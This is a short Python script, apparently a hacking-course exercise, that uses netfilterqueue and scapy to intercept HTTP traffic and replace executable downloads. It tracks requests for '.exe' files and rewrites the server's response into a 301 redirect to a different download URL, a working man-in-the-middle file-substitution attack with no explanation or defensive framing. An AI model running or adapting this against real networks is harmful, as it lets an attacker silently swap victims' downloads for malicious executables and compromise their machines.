#!/usr/bin/python3

import netfilterqueue as nq
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load.decode():
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+]  REplacing File")
                modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-611.exe\n\n")
                
                packet.set_payload((modified_packet))

    packet.accept()

queue = nq.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()
